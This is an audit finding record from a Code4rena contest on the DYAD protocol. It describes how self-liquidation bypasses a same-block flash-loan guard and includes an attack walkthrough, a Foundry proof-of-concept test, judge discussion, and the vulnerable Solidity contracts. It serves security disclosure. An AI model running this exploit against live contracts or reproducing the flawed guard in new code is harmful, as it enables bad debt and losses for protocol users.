{
  "Title": "[H-10] Flash loan protection mechanism can be bypassed via self-liquidations",
  "Content": "\n<https://github.com/code-423n4/2024-04-dyad/blob/44becc2f09c3a75bd548d5ec756a8e88a345e826/src/core/Vault.kerosine.sol#L47-L59>\n\n<https://github.com/code-423n4/2024-04-dyad/blob/44becc2f09c3a75bd548d5ec756a8e88a345e826/src/core/VaultManagerV2.sol#L225-L226>\n\n### Impact\n\nThe protocol implements a flash-loan manipulation protection mechanism with the `idToBlockOfLastDeposit` variable. This values is set to the current block number during a deposit, and is checked during a withdrawal. If the system detects a deposit and withdrawal in the same block, the system reverts the transaction.\n\n```solidity\n//function deposit\nidToBlockOfLastDeposit[id] = block.number;\n\n//function withdraw\nif (idToBlockOfLastDeposit[id] == block.number) revert DepositedInSameBlock();\n```\n\nThe issue is that there is another way to move funds around: liquidations. This calls the `move` function to transfer around the balances, and does not update the `idToBlockOfLastDeposit` of the receiving account.\n\n```solidity\n function liquidate(\n    uint id,\n    uint to\n  )\n  {\n    //...\n    vault.move(id, to, collateral);\n    //...\n  }\n```\n\nSo, a user can:\n\n1. Take out a flashloan. Deposit funds into a vault A. Mint dyad.\n2. Manipulate the price of kerosene to trigger a liquidation.\n3. Liquidate themselves and send their collateral to vault B.\n4. Withdraw from vault B in the same block.\n5. Pay off their flashloans.\n\nThe step 2 involves manipulating the price of kerosene, which affects their collateralization ratio. This has been discussed in a separate issue, and mainly states that if the user mints more dyad against free collateral in the system, or if any user takes out free collateral in the system, the price of kerosene will fall.\n\nThe flaw being discussed in this report is that the flash loan protection mechanism can be bypassed. This is different from the price manipulation issue and is thus a separate issue. Since this bypasses one of the primary safeguards in the system, this is a high severity issue.\n\n### Proof of Concept\n\nThe POC exploit setup requires 4 accounts: A, B, C and D:\n- A is where the flashed funds will be deposited to.\n- B is where the liquidated funds will be deposited to.\n- C is for manipulating the kerosene price.\n- D is for minting dyad at manipulated price to accrue bad debt in the system.\n\nWhere:\n\nA is used to **inflate** the price of kerosene.<br>\nB is used to bypass the flash loan protection mechanism.<br>\nC is used to **deflate** the price of kerosene.<br>\nD is used to mint dyad at the **inflated** price, accruing bad debt in the system and damaging the protocol.\n\n1. Assume C has 1 million usdc tokens with `0` debt. C inflates the price of kerosene up by contributing to TVL, and will be used later to push the price down.\n2. Alice takes out a flashloan of 10 million usdc tokens. She deposits them in account A.\n3. Due to the sudden added **massive** flashloaned TVL, the internal price of kerosene shoots up.\n4. Alice uses account D to mint out dyad tokens at this condition. Alice can now mint out exactly as many dyad tokens as her exo collateral. This is allowed since the price of kerosene is inflated, which covers the collateralization ratio. Alice effectively has a CR of close to 1.0 but the system thinks it's 1.5 due to kerosene being overvalued. The system is still solvent at this point.\n5. Alice buys kerosene from the market and adds it in account A and then mints dyad until account A has a CR of 1.5. The actual CR of A ignoring kerosene is close to 1.0.\n6. Alice now removes collateral from account C. This reduces the price of C, making Account A liquidatable.\n7. Alice now liquidates account A and sends the collateral to account B. This inflates the price of kerosene again since dyad supply has gone down, and she can repeat steps 5-6 multiple times since she can now mint more dyad tokens again.\n8. Alice gets a large portion of her flashed funds into account B She withdraws them back out. This again drops the price of kerosene, allowing her to liquidate A more and and recover more of her funds into account B.\n9. Alice pays back her flashloan.\n10. Account D is now left with a CR close to 1.0, since the price of kerosene has now gone back to normal. Any price fluctuations in the exo collateral will now lead to bad debt.\n\nThis lets Alice open positions at a CR of close to 1.0. This is very dangerous in a CDP protocol, since Alice's risk is very low as she can sell off the minted dyad to recover her investment, but the protocol is now at a very risky position, close to accruing bad debt. Thus this is a high severity issue.\n\n### Recommended Mitigation Steps\n\nThe flashloan protection can be bypassed. MEV liquidation bots rely on flashloans to carryout liquidations, so there isn't a very good way to prevent this attack vector. Making the price of kerosene less manipulatable is a good way to lower this attack chance. However, the system will still be open to flashloan deposits via liquidations.\n\nIncorporating a mint fee will also help mitigate this vector, since the attacker will have a higher cost to manipulate the system.\n\n**[shafu0x (DYAD) confirmed](https://github.com/code-423n4/2024-04-dyad-findings/issues/68#event-12659937331)**\n\n**[Koolex (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-04-dyad-findings/issues/68#issuecomment-2094809101):**\n > @carrotsmuggler - the attack assumes that kerosine is used within the CR. Could you please clarify how the attacker would acquire this big amount of kerosine?\n\n**[carrotsmuggler (warden) commented](https://github.com/code-423n4/2024-04-dyad-findings/issues/68#issuecomment-2094811077):**\n > @Koolex - kerosene can just be bought off of DEXs and other open markets. In this attack, kerosene is not being flashloaned. Kerosene is just required as an initial investment. USDC is flashloaned, and dyad tokens are minted against that up to a CR of 1.5, which drops to 1.0 once the value of kerosene drops.\n> \n> The point of the issue is to show that the flashloan protection can be bypassed, which is being done here by utilising multiple accounts. \n\n**[Koolex (judge) commented](https://github.com/code-423n4/2024-04-dyad-findings/issues/68#issuecomment-2094847169):**\n > @carrotsmuggler - I'm requesting a PoC (with code) in order to be able to evaluate the severity better. At the moment, the attack is too expensive since the attacker should hold a big amount of Kerosene, which practically difficult since  Kerosene is being distributed over 10 years. Unless there is a demonstrated impact on the protocol, this would be a QA.\n\n**[carrotsmuggler (warden) commented](https://github.com/code-423n4/2024-04-dyad-findings/issues/68#issuecomment-2118086033):**\n > The problem this issue addresses, is that the flash loan protection can be bypassed. For that, a POC is taken from the issue [#537](https://github.com/code-423n4/2024-04-dyad-findings/issues/537) showing that self liquidation can be used to flash funds, manipulate the system, and then take them out in the same transaction.\n> \n> However, the main point of contention here seems to be the impact. Flashloans in general don't do anything a well funded attacker cannot do on their own, and not an exploit on their own. However, they can be used to exacerbate an existing problem by anyone, well funded or not.\n> \n> To eradicate this vector, and to make the system less manipulatable, the devs had put in certain restrictions. This issue shows that these restrictions are insufficient. So users can use flashloans and thus a near infinite amount of funds to manipulate the system. This was reported since the devs had explicitly put up a counter to this.\n> \n> Since this breaks the safeguards put in place by the devs and makes the system more easily manipulatable, I believe this is of medium severity. This can be used in [#67](https://github.com/code-423n4/2024-04-dyad-findings/issues/67), but should not be a duplicate. This can also be abused to mint positions at 100% CR instead of 150% with a very large volume by anyone due to the flashloans, which makes the system way more unstable. Even small changes in price at that condition will be enough to cause bad debt to the system then.\n> \n> <details>\n>\n> ```solidity\n> // SPDX-License-Identifier: MIT\n> pragma solidity =0.8.17;\n> \n> import \"forge-std/Test.sol\";\n> import \"forge-std/console.sol\";\n> import {DeployBase, Contracts} from \"../script/deploy/DeployBase.s.sol\";\n> import {Parameters} from \"../src/params/Parameters.sol\";\n> import {DNft} from \"../src/core/DNft.sol\";\n> import {Dyad} from \"../src/core/Dyad.sol\";\n> import {Licenser} from \"../src/core/Licenser.sol\";\n> import {VaultManagerV2} from \"../src/core/VaultManagerV2.sol\";\n> import {Vault} from \"../src/core/Vault.sol\";\n> import {OracleMock} from \"./OracleMock.sol\";\n> import {ERC20Mock} from \"./ERC20Mock.sol\";\n> import {IAggregatorV3} from \"../src/interfaces/IAggregatorV3.sol\";\n> import {ERC20} from \"@solmate/src/tokens/ERC20.sol\";\n> \n> import {KerosineManager}        from \"../src/core/KerosineManager.sol\";\n> import {UnboundedKerosineVault} from \"../src/core/Vault.kerosine.unbounded.sol\";\n> import {BoundedKerosineVault}   from \"../src/core/Vault.kerosine.bounded.sol\";\n> import {Kerosine}               from \"../src/staking/Kerosine.sol\";\n> import {KerosineDenominator}    from \"../src/staking/KerosineDenominator.sol\";\n> \n> contract VaultManagerV2Test is Test, Parameters {\n>   DNft         dNft;\n>   Licenser     vaultManagerLicenser;\n>   Licenser     vaultLicenser;\n>   Dyad         dyad;\n>   VaultManagerV2 vaultManagerV2;\n>  \n> \n>   // weth\n>   Vault        wethVault;\n>   ERC20Mock    weth;\n>   OracleMock   wethOracle;\n> \n>   //Kerosine\n>   Kerosine kerosine;\n>   UnboundedKerosineVault unboundedKerosineVault;\n> \n>   KerosineManager        kerosineManager;\n>   KerosineDenominator    kerosineDenominator;\n>   \n>   //users\n>   address user1;\n>   address user2;\n> \n>   function setUp() public {\n>     dNft       = new DNft();\n>     weth       = new ERC20Mock(\"WETH-TEST\", \"WETHT\");\n>     wethOracle = new OracleMock(3000e8);\n> \n>     vaultManagerLicenser = new Licenser();\n>     vaultLicenser        = new Licenser();\n> \n>     dyad   = new Dyad(vaultManagerLicenser);\n> \n>     //vault Manager V2\n>     vaultManagerV2    = new VaultManagerV2(\n>         dNft,\n>         dyad,\n>         vaultLicenser\n>       );\n> \n>     //vault\n>        wethVault                   = new Vault(\n>         vaultManagerV2,\n>         ERC20(address(weth)),\n>         IAggregatorV3(address(wethOracle))\n>       );\n> \n>     //kerosineManager\n>     kerosineManager = new KerosineManager();\n>     kerosineManager.add(address(wethVault));\n> \n>     vaultManagerV2.setKeroseneManager(kerosineManager);\n> \n>     //kerosine token\n>     kerosine = new Kerosine();\n>     //Unbounded KerosineVault\n>     unboundedKerosineVault = new UnboundedKerosineVault(\n>       vaultManagerV2,\n>       kerosine, \n>       dyad,\n>       kerosineManager\n>     );\n>     \n> \n>     //kerosineDenominator\n>     kerosineDenominator       = new KerosineDenominator(\n>       kerosine\n>     );\n>     unboundedKerosineVault.setDenominator(kerosineDenominator);\n> \n>     //Licenser add vault\n>     vaultLicenser.add(address(wethVault));\n>     vaultLicenser.add(address(unboundedKerosineVault));\n> \n>     //vaultManagerLicenser add manager\n>     vaultManagerLicenser.add(address(vaultManagerV2));\n> \n>   }\n> \n> function testFlashLoanAttackUsingLiquidateSimulation() public{\n>     wethOracle.setPrice(1000e8);\n>     //1 The attacker prepares two NFTs ,some collateral and some Kerosene Token.\n>     uint id = mintDNft();\n>     uint id_for_liquidator = mintDNft();\n>     weth.mint(address(this), 1e18);\n> \n>     //2 deposit all the non-Kerosene collateral in the vault with One NFT like id=1 \n>     vaultManagerV2.add(id_for_liquidator, address(wethVault));\n>     weth.approve(address(vaultManagerV2), 1e18);\n>     vaultManagerV2.deposit(id_for_liquidator, address(wethVault), 1e18);\n> \n>     //3 In the next blocknumber, flashloan non-Kerosene collateral from Lending like Aave,\n>     vm.roll(block.number + 1);\n>     weth.mint(address(this), 1e18);//Simulation borrow 1 weth\n> \n>     //deposit all the borrowed flashloan non-Kerosene collateral and Kerosene Token in the vault with One NFT like id=0\n>     vaultManagerV2.add(id, address(wethVault));\n>     weth.approve(address(vaultManagerV2), 1e18);\n>     vaultManagerV2.deposit(id, address(wethVault), 1e18);\n> \n>     vaultManagerV2.addKerosene(id, address(unboundedKerosineVault));\n>     kerosine.approve(address(vaultManagerV2), 1000_000_000e18);\n>     vaultManagerV2.deposit(id, address(unboundedKerosineVault), 1000_000_000e18);\n> \n>     //Mint the max number Dyad you can\n>     vaultManagerV2.mintDyad(id, 1000e18, address(this));\n>     uint256 cr = vaultManagerV2.collatRatio(id); //2e18\n>     assertEq(cr, 2e18);\n> \n>     //withdraw using id_for_liquidator,  manipulate the  Kerosene price\n>     vaultManagerV2.withdraw(id_for_liquidator, address(wethVault), 1e18, address(this));\n>     cr = vaultManagerV2.collatRatio(id); //1e18\n>     assertEq(cr, 1e18);\n>     //liquidate\n>     vaultManagerV2.liquidate(id, id_for_liquidator);\n>     //withdraw the vault which is move from id  using id_for_liquidator\n>     vaultManagerV2.withdraw(id_for_liquidator, address(wethVault), 1e18, address(this));\n>     console.log(\"weth balance is \", weth.balanceOf(address(this))/1e18);\n> }\n> \n>   function mintDNft() public returns (uint) {\n>     return dNft.mintNft{value: 1 ether}(address(this));\n>   }\n> \n>  function deposit(\n>     ERC20Mock token,\n>     uint      id,\n>     address   vault,\n>     uint      amount\n>   ) public {\n>     vaultManagerV2.add(id, vault);\n>     token.mint(address(this), amount);\n>     token.approve(address(vaultManagerV2), amount);\n>     vaultManagerV2.deposit(id, address(vault), amount);\n>   }\n> \n>   receive() external payable {}\n> \n>   function onERC721Received(\n>     address,\n>     address,\n>     uint256,\n>     bytes calldata\n>   ) external pure returns (bytes4) {\n>     return 0x150b7a02;\n>   }\n> }\n> ```\n> </details>\n>\n\n**[adam-idarrha (warden) commented](https://github.com/code-423n4/2024-04-dyad-findings/issues/68#issuecomment-2118214281):**\n > For the impact the sponsors stated quite clearly from the DYAD code4rena audit page that the main point of migrating from `vaultManagerV1` to `V2` is the need for a flashloan protection mechanism, and the impact of the bypass is the ability to manipulate kerosene price which could lead to mass liquidations as discussed in separate issues:\n> \n> > Attack ideas (where to focus for bugs).<br>\n> > Manipulation of Kerosene Price.<br>\n> > Flash Loan attacks. <br>\n> > Migration.\n> \n> > The goal is to migrate from `VaultManager` to `VaultManagerV2`. The main reason is the need for a flash loan protection which makes it harder to manipulate the deterministic Kerosene price.\n\n**[Koolex (judge) increased severity to High and commented](https://github.com/code-423n4/2024-04-dyad-findings/issues/68#issuecomment-2134814911):**\n > After reading all the comments above, I believe this should be a valid high due to the following reasons:\n> - Flash loan protection can be bypassed, since this didn't exist in V1, it seems to me, it is a major change in V2.\n> - Price manipulation impact is demonstrated above, which is caused by utilising Flash loans.\n> - Flash loan attacks mentioned under Attack ideas of the audit page, obviously, the sponsor is interested in breaking this validation put in place.\n> - Not a dup of [#67](https://github.com/code-423n4/2024-04-dyad-findings/issues/67)\n>   - 67's attack is less accessible unlike with Flash loans where anyone can perform it. \n>   - Furthermore, 67 isnâ€™t necessarily to be performed as an attack, the event could occur naturally when whales intend to withdraw funds.\n\n*Note: For full discussion, see [here](https://github.com/code-423n4/2024-04-dyad-findings/issues/68).*\n\n***\n\n \n",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/reports/2024-04-dyad",
  "Code": [
    {
      "filename": "src/core/Vault.kerosine.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity =0.8.17;\n\nimport {IVaultManager}   from \"../interfaces/IVaultManager.sol\";\nimport {KerosineManager} from \"./KerosineManager.sol\";\nimport {IVault}          from \"../interfaces/IVault.sol\";\n\nimport {SafeTransferLib} from \"@solmate/src/utils/SafeTransferLib.sol\";\nimport {ERC20}           from \"@solmate/src/tokens/ERC20.sol\";\nimport {Owned}           from \"@solmate/src/auth/Owned.sol\";\n\nabstract contract KerosineVault is IVault, Owned(msg.sender) {\n  using SafeTransferLib for ERC20;\n\n  IVaultManager   public immutable vaultManager;\n  ERC20           public immutable asset;\n  KerosineManager public immutable kerosineManager;\n\n  mapping(uint => uint) public id2asset;\n\n  modifier onlyVaultManager() {\n    if (msg.sender != address(vaultManager)) revert NotVaultManager();\n    _;\n  }\n\n  constructor(\n    IVaultManager   _vaultManager,\n    ERC20           _asset, \n    KerosineManager _kerosineManager \n  ) {\n    vaultManager    = _vaultManager;\n    asset           = _asset;\n    kerosineManager = _kerosineManager;\n  }\n\n  function deposit(\n    uint id,\n    uint amount\n  )\n    public \n      onlyVaultManager\n  {\n    id2asset[id] += amount;\n    emit Deposit(id, amount);\n  }\n\n  function move(\n    uint from,\n    uint to,\n    uint amount\n  )\n    external\n      onlyVaultManager\n  {\n    id2asset[from] -= amount;\n    id2asset[to]   += amount;\n    emit Move(from, to, amount);\n  }\n\n  function getUsdValue(\n    uint id\n  )\n    public\n    view \n    returns (uint) {\n      return id2asset[id] * assetPrice() / 1e8;\n  }\n\n  function assetPrice() \n    public \n    view \n    virtual\n    returns (uint); \n}"
    },
    {
      "filename": "src/core/VaultManagerV2.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity =0.8.17;\n\nimport {DNft}            from \"./DNft.sol\";\nimport {Dyad}            from \"./Dyad.sol\";\nimport {Licenser}        from \"./Licenser.sol\";\nimport {Vault}           from \"./Vault.sol\";\nimport {IVaultManager}   from \"../interfaces/IVaultManager.sol\";\nimport {KerosineManager} from \"../../src/core/KerosineManager.sol\";\n\nimport {FixedPointMathLib} from \"@solmate/src/utils/FixedPointMathLib.sol\";\nimport {ERC20}             from \"@solmate/src/tokens/ERC20.sol\";\nimport {SafeTransferLib}   from \"@solmate/src/utils/SafeTransferLib.sol\";\nimport {EnumerableSet}     from \"@openzeppelin/contracts/utils/structs/EnumerableSet.sol\";\nimport {Initializable}     from \"@openzeppelin/contracts/proxy/utils/Initializable.sol\";\n\ncontract VaultManagerV2 is IVaultManager, Initializable {\n  using EnumerableSet     for EnumerableSet.AddressSet;\n  using FixedPointMathLib for uint;\n  using SafeTransferLib   for ERC20;\n\n  uint public constant MAX_VAULTS          = 5;\n  uint public constant MAX_VAULTS_KEROSENE = 5;\n\n  uint public constant MIN_COLLATERIZATION_RATIO = 1.5e18; // 150%\n  uint public constant LIQUIDATION_REWARD        = 0.2e18; //  20%\n\n  DNft     public immutable dNft;\n  Dyad     public immutable dyad;\n  Licenser public immutable vaultLicenser;\n\n  KerosineManager public keroseneManager;\n\n  mapping (uint => EnumerableSet.AddressSet) internal vaults; \n  mapping (uint => EnumerableSet.AddressSet) internal vaultsKerosene; \n\n  mapping (uint => uint) public idToBlockOfLastDeposit;\n\n  modifier isDNftOwner(uint id) {\n    if (dNft.ownerOf(id) != msg.sender)   revert NotOwner();    _;\n  }\n  modifier isValidDNft(uint id) {\n    if (dNft.ownerOf(id) == address(0))   revert InvalidDNft(); _;\n  }\n  modifier isLicensed(address vault) {\n    if (!vaultLicenser.isLicensed(vault)) revert NotLicensed(); _;\n  }\n\n  constructor(\n    DNft          _dNft,\n    Dyad          _dyad,\n    Licenser      _licenser\n  ) {\n    dNft          = _dNft;\n    dyad          = _dyad;\n    vaultLicenser = _licenser;\n  }\n\n  function setKeroseneManager(KerosineManager _keroseneManager) \n    external\n      initializer \n    {\n      keroseneManager = _keroseneManager;\n  }\n\n  /// @inheritdoc IVaultManager\n  function add(\n      uint    id,\n      address vault\n  ) \n    external\n      isDNftOwner(id)\n  {\n    if (vaults[id].length() >= MAX_VAULTS) revert TooManyVaults();\n    if (!vaultLicenser.isLicensed(vault))  revert VaultNotLicensed();\n    if (!vaults[id].add(vault))            revert VaultAlreadyAdded();\n    emit Added(id, vault);\n  }\n\n  function addKerosene(\n      uint    id,\n      address vault\n  ) \n    external\n      isDNftOwner(id)\n  {\n    if (vaultsKerosene[id].length() >= MAX_VAULTS_KEROSENE) revert TooManyVaults();\n    if (!keroseneManager.isLicensed(vault))                 revert VaultNotLicensed();\n    if (!vaultsKerosene[id].add(vault))                     revert VaultAlreadyAdded();\n    emit Added(id, vault);\n  }\n\n  /// @inheritdoc IVaultManager\n  function remove(\n      uint    id,\n      address vault\n  ) \n    external\n      isDNftOwner(id)\n  {\n    if (Vault(vault).id2asset(id) > 0) revert VaultHasAssets();\n    if (!vaults[id].remove(vault))     revert VaultNotAdded();\n    emit Removed(id, vault);\n  }\n\n  function removeKerosene(\n      uint    id,\n      address vault\n  ) \n    external\n      isDNftOwner(id)\n  {\n    if (Vault(vault).id2asset(id) > 0)     revert VaultHasAssets();\n    if (!vaultsKerosene[id].remove(vault)) revert VaultNotAdded();\n    emit Removed(id, vault);\n  }\n\n  /// @inheritdoc IVaultManager\n  function deposit(\n    uint    id,\n    address vault,\n    uint    amount\n  ) \n    external \n      isValidDNft(id)\n  {\n    idToBlockOfLastDeposit[id] = block.number;\n    Vault _vault = Vault(vault);\n    _vault.asset().safeTransferFrom(msg.sender, address(vault), amount);\n    _vault.deposit(id, amount);\n  }\n\n  /// @inheritdoc IVaultManager\n  function withdraw(\n    uint    id,\n    address vault,\n    uint    amount,\n    address to\n  ) \n    public\n      isDNftOwner(id)\n  {\n    if (idToBlockOfLastDeposit[id] == block.number) revert DepositedInSameBlock();\n    uint dyadMinted = dyad.mintedDyad(address(this), id);\n    Vault _vault = Vault(vault);\n    uint value = amount * _vault.assetPrice() \n                  * 1e18 \n                  / 10**_vault.oracle().decimals() \n                  / 10**_vault.asset().decimals();\n    if (getNonKeroseneValue(id) - value < dyadMinted) revert NotEnoughExoCollat();\n    _vault.withdraw(id, to, amount);\n    if (collatRatio(id) < MIN_COLLATERIZATION_RATIO)  revert CrTooLow(); \n  }\n\n  /// @inheritdoc IVaultManager\n  function mintDyad(\n    uint    id,\n    uint    amount,\n    address to\n  )\n    external \n      isDNftOwner(id)\n  {\n    uint newDyadMinted = dyad.mintedDyad(address(this), id) + amount;\n    if (getNonKeroseneValue(id) < newDyadMinted)     revert NotEnoughExoCollat();\n    dyad.mint(id, to, amount);\n    if (collatRatio(id) < MIN_COLLATERIZATION_RATIO) revert CrTooLow(); \n    emit MintDyad(id, amount, to);\n  }\n\n  /// @inheritdoc IVaultManager\n  function burnDyad(\n    uint id,\n    uint amount\n  ) \n    external \n      isValidDNft(id)\n  {\n    dyad.burn(id, msg.sender, amount);\n    emit BurnDyad(id, amount, msg.sender);\n  }\n\n  /// @inheritdoc IVaultManager\n  function redeemDyad(\n    uint    id,\n    address vault,\n    uint    amount,\n    address to\n  )\n    external \n      isDNftOwner(id)\n    returns (uint) { \n      dyad.burn(id, msg.sender, amount);\n      Vault _vault = Vault(vault);\n      uint asset = amount \n                    * (10**(_vault.oracle().decimals() + _vault.asset().decimals())) \n                    / _vault.assetPrice() \n                    / 1e18;\n      withdraw(id, vault, asset, to);\n      emit RedeemDyad(id, vault, amount, to);\n      return asset;\n  }\n\n  /// @inheritdoc IVaultManager\n  function liquidate(\n    uint id,\n    uint to\n  ) \n    external \n      isValidDNft(id)\n      isValidDNft(to)\n    {\n      uint cr = collatRatio(id);\n      if (cr >= MIN_COLLATERIZATION_RATIO) revert CrTooHigh();\n      dyad.burn(id, msg.sender, dyad.mintedDyad(address(this), id));\n\n      uint cappedCr               = cr < 1e18 ? 1e18 : cr;\n      uint liquidationEquityShare = (cappedCr - 1e18).mulWadDown(LIQUIDATION_REWARD);\n      uint liquidationAssetShare  = (liquidationEquityShare + 1e18).divWadDown(cappedCr);\n\n      uint numberOfVaults = vaults[id].length();\n      for (uint i = 0; i < numberOfVaults; i++) {\n          Vault vault      = Vault(vaults[id].at(i));\n          uint  collateral = vault.id2asset(id).mulWadUp(liquidationAssetShare);\n          vault.move(id, to, collateral);\n      }\n      emit Liquidate(id, msg.sender, to);\n  }\n\n  function collatRatio(\n    uint id\n  )\n    public \n    view\n    returns (uint) {\n      uint _dyad = dyad.mintedDyad(address(this), id);\n      if (_dyad == 0) return type(uint).max;\n      return getTotalUsdValue(id).divWadDown(_dyad);\n  }\n\n  function getTotalUsdValue(\n    uint id\n  ) \n    public \n    view\n    returns (uint) {\n      return getNonKeroseneValue(id) + getKeroseneValue(id);\n  }\n\n  function getNonKeroseneValue(\n    uint id\n  ) \n    public \n    view\n    returns (uint) {\n      uint totalUsdValue;\n      uint numberOfVaults = vaults[id].length(); \n      for (uint i = 0; i < numberOfVaults; i++) {\n        Vault vault = Vault(vaults[id].at(i));\n        uint usdValue;\n        if (vaultLicenser.isLicensed(address(vault))) {\n          usdValue = vault.getUsdValue(id);        \n        }\n        totalUsdValue += usdValue;\n      }\n      return totalUsdValue;\n  }\n\n  function getKeroseneValue(\n    uint id\n  ) \n    public \n    view\n    returns (uint) {\n      uint totalUsdValue;\n      uint numberOfVaults = vaultsKerosene[id].length(); \n      for (uint i = 0; i < numberOfVaults; i++) {\n        Vault vault = Vault(vaultsKerosene[id].at(i));\n        uint usdValue;\n        if (keroseneManager.isLicensed(address(vault))) {\n          usdValue = vault.getUsdValue(id);        \n        }\n        totalUsdValue += usdValue;\n      }\n      return totalUsdValue;\n  }\n\n  // ----------------- MISC ----------------- //\n\n  function getVaults(\n    uint id\n  ) \n    external \n    view \n    returns (address[] memory) {\n      return vaults[id].values();\n  }\n\n  function hasVault(\n    uint    id,\n    address vault\n  ) \n    external \n    view \n    returns (bool) {\n      return vaults[id].contains(vault);\n  }\n}"
    }
  ]
}